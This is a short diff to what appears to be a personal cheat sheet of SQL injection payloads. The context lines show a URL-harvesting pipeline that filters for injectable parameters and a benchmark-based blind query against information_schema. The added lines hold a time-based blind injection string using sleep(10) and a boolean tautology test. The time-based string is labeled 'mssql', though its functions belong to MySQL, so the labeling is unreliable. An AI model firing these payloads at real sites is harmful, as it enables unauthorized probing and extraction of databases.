@@ -47,3 +47,17 @@ cat subs.alive | gau_go -b jpg,png,gif > urls.check && gf_go sqli urls.check > u
 select if( table_name like 'x', benchmark(100000,sha1('_Y000!_')), concat(table_name) ) from information_schema.tables
 ```
 
+
+
+mssql
+
+```
+'xor(if(now()=sysdate(),sleep(10),0))or'
+```
+
+
+
+```
+1 AND 1726=1726
+```
+
